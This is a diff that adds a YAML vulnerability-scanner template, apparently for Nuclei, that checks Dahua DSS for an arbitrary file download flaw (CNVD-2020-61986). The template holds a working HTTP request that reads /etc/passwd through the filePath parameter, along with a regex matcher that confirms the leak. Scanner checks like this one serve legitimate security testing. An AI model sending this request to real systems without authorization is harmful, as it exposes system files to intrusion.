@@ -1,0 +1,25 @@
+id: poc-yaml-dahua-dss-arbitrary-file-download-cnvd-2020-61986
+
+info:
+  name: poc-yaml-dahua-dss-arbitrary-file-download-cnvd-2020-61986
+  author: Aurora
+  severity: medium
+  tags: xray-converted,cnvd-2020-61986,ct-456698
+  reference:
+    - https://forum.butian.net/share/141
+
+http:
+  - raw:
+      - |
+        GET /itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:(.*):0:0:"
